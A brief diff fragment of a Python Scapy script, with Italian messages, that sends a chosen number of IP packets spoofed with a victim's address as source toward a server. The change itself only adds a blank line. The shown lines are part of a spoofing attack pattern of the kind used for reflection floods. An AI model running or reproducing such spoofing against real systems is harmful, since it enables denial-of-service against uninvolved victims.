@@ -20,3 +20,4 @@ pkt = IP(src=victim_ip, dst=server_ip) / \
 print(f"\n[*] Inviando {count_pkts} pacchetti spoofati...")
 send(pkt, count=count_pkts, verbose=0)
 print(f"[+] Inviati {count_pkts} pacchetti.\n")
+
